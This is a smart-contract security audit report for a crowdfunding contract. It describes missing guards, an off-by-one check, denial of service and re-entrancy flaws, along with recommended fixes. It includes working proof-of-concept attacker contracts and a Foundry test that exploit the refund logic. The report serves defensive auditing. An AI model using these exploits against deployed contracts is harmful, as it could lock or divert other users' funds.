# BatchRefundCrowdfund — Security Audit Report



---



## H1 — No Deadline Check in `contribute()`

**Severity:** High

**Summary:**  
`contribute()` accepts ETH after the campaign deadline. Late contributions corrupt the outcome after `finalize()` should have settled it.

**Root Cause:**  
Missing `require(block.timestamp < deadline)` guard in `contribute()`.

**Attack Path:**  
1. Deadline passes; campaign is just below goal.  
2. Attacker calls `contribute()` with enough ETH to push `totalRaised > goal`.  
3. Anyone calls `finalize()` campaign is now marked successful.  
4. Creator withdraws, including attacker's ETH. Attacker has no refund path.


**Recommendation:**
```solidity
function contribute() external payable {
    require(block.timestamp < deadline, "Campaign ended");
    require(msg.value > 0, "No ETH");
    // ...
}
```

---

## C1 — No `!finalized` Check in `contribute()` — Two Distinct Exploits

**Severity:** Critical

**Summary:**  
this closely resembles with the above high 
it leads to two different scenarios 
fund theft by creator and permanent lock of user funds 


**Root Cause:**  
Missing `require(!finalized)` guard in `contribute()`.

**Attack Path — A (Fund Theft):**  
1. Campaign finalizes successfully.  
2. Victim calls `contribute()` no guard blocks it; ETH accepted.  
3. Creator calls `creatorWithdraw()`, draining `address(this).balance` including victim's late deposit.  
4. Victim has no refund path since `successful == true`.

**Attack Path — B (Fund Lock):**  
1. Campaign fails; `processRefunds` runs to completion (`nextRefundIndex == contributors.length`).  
2. Late user calls `contribute()` —> gets added to `contributors[]`, ETH accepted.  
3. `nextRefundIndex` is already past the end; no refund loop ever reaches them again.  
4. ETH permanently locked in contract.


**Recommendation:**
```solidity
function contribute() external payable {
    require(!finalized, "Campaign finalized");
    require(block.timestamp < deadline, "Campaign ended");
    require(msg.value > 0, "No ETH");
    // ...
}
```

---

## H2 — Wrong Comparison Operator in `finalize()`

**Severity:** High

**Summary:**  
`totalRaised > goal` should be `totalRaised >= goal`. A campaign that hits the exact goal is wrongly marked as failed.

**Root Cause:**  
Off-by-one logic error: strict `>` instead of `>=`.

**Attack Path:**  
1. Campaign goal is 10 ETH.  
2. Contributors deposit exactly 10 ETH.  
3. `finalize()` is called —> `10 > 10` is `false`.  
4. `successful` remains `false`; creator cannot withdraw.  
5. All funds get refunded despite goal being met.


**Recommendation:**
```solidity
if (totalRaised >= goal) {
    successful = true;
}
```



---

## C2 — denial of service attack in processRefund function 

**Severity:** 🔴 Critical

**Summary:**  
A single contributor with a reverting `receive()` causes the entire batch to revert. Since `nextRefundIndex` never advances past that address, all subsequent contributors are permanently locked out of refunds.

**Root Cause:**  
Push payment pattern with `require(ok)` instead of pull or skip on failure.

**Attack Path:**  
1. Attacker contributes with a contract that has `receive() { revert(); }`.  
2. `processRefunds()` reaches attacker's address.  
3. `user.call{value: amount}("")` returns `ok = false`.  
4. `require(ok, "Refund failed")` reverts the whole transaction.  
5. `nextRefundIndex` is not incremented; it stays pointing at attacker.  
6. Every future `processRefunds()` call hits the same address and reverts.  
7. All contributors after the attacker never get refunded.

**Proof of Concept:**
```solidity
contract RevertingReceiver {
    receive() external payable {
        revert("blocked");
    }

    function contribute(BatchRefundCrowdfund target) external payable {
        target.contribute{value: msg.value}();
    }
    // Any processRefunds() call that reaches this address reverts permanently
}
```

**Recommendation:**  
Skip failed refunds and allow manual claim:
```solidity
if (amount > 0) {
    contributed[user] = 0;
    (bool ok, ) = user.call{value: amount}("");
    if (!ok) {
        contributed[user] = amount; // re-credit for manual pull
    }
}
nextRefundIndex++;
processed++;
```

Add a `claimRefund()` function for pull-based fallback.

---

## H3 — Re-entrancy in `processRefunds()` Skips a Contributor Permanently

**Severity:** High

**Summary:**  
A malicious contributor can re-enter `processRefunds()` during their refund callback. The re-entrant call advances `nextRefundIndex` ahead of the outer call, causing the outer call to then double-increment and permanently skip the next contributor in line.

**Root Cause:**  
`nextRefundIndex` is incremented after the external call, not before. Re-entrant call and outer call both touch the same index variable.

**Attack Path:**  
1. Attacker is at `contributors[X]`. Outer call sets `contributed[X] = 0`, then calls `X.receive()`.  
2. Inside `receive()`, attacker re-enters `processRefunds(maxUsers=2)`.  
3. Inner call: `nextRefundIndex` is still `X` (not yet incremented by outer). Sees `amount == 0` for attacker, skips value transfer, increments to `X+1`, processes `X+1` (Bob), increments to `X+2`.  
4. Inner call returns. Outer call resumes, increments `nextRefundIndex` from `X+2` to `X+3`.  
5. Contributor at `X+3` is forever skipped — `nextRefundIndex` will never reach them again.

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";


contract ReentrantRefunder {
    BatchRefundCrowdfund public target;
    bool public reentered;

    function contributeTo(BatchRefundCrowdfund _target) external payable {
        target = _target;
        target.contribute{value: msg.value}();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            target.processRefunds(2);
        }
    }
}

contract BatchRefundCrowdfundReentrancyTest is Test {
    BatchRefundCrowdfund internal crowd;
    ReentrantRefunder internal attacker;
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal carol = makeAddr("carol");

    function setUp() external {
        crowd = new BatchRefundCrowdfund(100 ether, 1 days);
        attacker = new ReentrantRefunder();

        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
        vm.deal(carol, 1 ether);
        vm.deal(address(this), 1 ether);

        vm.prank(alice);
        crowd.contribute{value: 1 ether}(); // index 0

        attacker.contributeTo{value: 1 ether}(crowd); // index 1

        vm.prank(bob);
        crowd.contribute{value: 1 ether}(); // index 2

        vm.prank(carol);
        crowd.contribute{value: 1 ether}(); // index 3

        vm.warp(block.timestamp + 1 days);
        crowd.finalize();

        assertFalse(crowd.successful(), "campaign must fail to enable refunds");
    }

    function test_reentrancy_skips_contributor_permanently() external {
        // First process only Alice, so attacker sits at nextRefundIndex.
        crowd.processRefunds(1);
        assertEq(crowd.nextRefundIndex(), 1, "attacker should be next");

        uint256 carolBalanceBefore = carol.balance;

        // Outer call refunds attacker and triggers reentrant inner call.
        crowd.processRefunds(2);

        // Reentrancy causes a double-advance: index jumps from 1 to 4.
        assertEq(crowd.nextRefundIndex(), 4, "index corrupted by reentrancy");

        // Carol (index 3) was never processed and remains entitled.
        assertEq(crowd.contributed(carol), 1 ether, "carol contribution should remain");
        assertEq(carol.balance, carolBalanceBefore, "carol did not get refunded");

        // Contract still holds Carol's funds, but pointer is at end so future batches cannot reach her.
        assertEq(address(crowd).balance, 1 ether, "stuck funds remain in contract");

        crowd.processRefunds(10);
        assertEq(crowd.nextRefundIndex(), 4, "cannot move beyond end");
        assertEq(crowd.contributed(carol), 1 ether, "carol stays permanently skipped");
    }
}



```

**Recommendation:**  
use pull method by using claimRefund function instead of push refund method

---

## M1 — duplicate entry via Contributor Array Flaw Enables Gas Griefing attack 

**Severity:** Medium

**Summary:**  
A contributor can be added to `contributors[]` multiple times by entering the array with low eth transfer in wei's . This inflates the array and forces legitimate contributors to pay extra gas over many more refund batches.

**Root Cause:**  
 `if (contributed[msg.sender] == 0)` re-arms after `contributed[user]` is zeroed during refund. Combined with missing `!finalized` check in `contribute()`, the attacker can re-enter the array indefinitely.

**Attack Path:**  
1. Attacker calls `contribute(1 wei)` → added to `contributors[]`.  
2. Refund batch processes attacker → `contributed[attacker] = 0`.  
3. Attacker calls `contribute(1 wei)` again (no finalized guard) → added to `contributors[]` a second time.  
4. Repeat N times at cost of ~1 wei + gas per cycle.  
5. `contributors[]` is bloated with N duplicate entries for attacker.  
6. Each `processRefunds()` batch wastes iterations on zero-value attacker entries, costing all legitimate contributors additional gas rounds.
7. Cost to attacker: N wei + gas. 
8. Cost to victims: proportionally more batch rounds.
9. cost to protocol : more gas fee


**Recommendation:**  
Track whether an address has ever contributed using a separate mapping, so dedup is permanent:
```solidity
mapping(address => bool) public refunded;

// In processRefunds():
contributed[user] = 0;
refunded[user] = true;

// In contribute():
if (contributed[msg.sender] == 0 && !refunded[msg.sender]) {
    contributors.push(msg.sender);
}
```

---